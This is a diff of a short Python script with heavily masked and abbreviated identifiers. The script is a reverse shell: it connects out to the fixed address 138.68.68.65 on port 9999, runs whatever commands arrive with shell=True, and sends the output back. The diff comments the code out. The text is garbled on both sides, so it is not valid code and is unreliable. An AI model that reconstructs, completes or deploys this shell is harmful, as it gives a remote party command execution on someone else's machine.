@@ -1,23 +1,23 @@
-______ so..
-______ __
-______ su..
-
-s _ ?.?
-host _ '138.68.68.65'
-port _ 9999
-
-s.c..((host, port))
-
-w__ T..:
-    data _ s.r..(1024)
-    __ data[:2].d..("utf-8") __ 'cd':
-        __.chdir(data[3:].d..("utf-8"))
-
-    __ le.(data) > 0:
-        cmd _ ?.Popen(data[:].d..("utf-8"),shell_T.., s_o.._?.PIPE, stdin_?.PIPE, s_e.._?.PIPE)
-        output_byte _ cmd.s_o...r.. + cmd.s_e...r..
-        output_str _ st.(output_byte,"utf-8")
-        currentWD _ __.getcwd + "> "
-        s.s..(st..en..(output_str + currentWD))
-
-        print(output_str)
+# ______ so..
+# ______ __
+# ______ su..
+#
+# s _ ?.?
+# host _ '138.68.68.65'
+# port _ 9999
+#
+# s.c.. ?
+#
+# w__ T..
+#     data _ s.r.. 1024
+#     __ ? ;2 .d.. "utf-8" __ 'cd'
+#         __.c.. ? 3; .d.. "utf-8"
+#
+#     __ le. ? > 0
+#         cmd _ ?.P.. ? ; .d.. "utf-8" sh.._T.. s_o.._?.P.. s_i.._?.P.. s_e.._?.P..
+#         output_byte _ ?.s_o...r.. + ?.s_e...r..
+#         output_str _ st. ? "utf-8"
+#         currentWD _ __.g_c.. + "> "
+#         s.s.. st..en.. o_s.. + ?
+#
+#         print ?
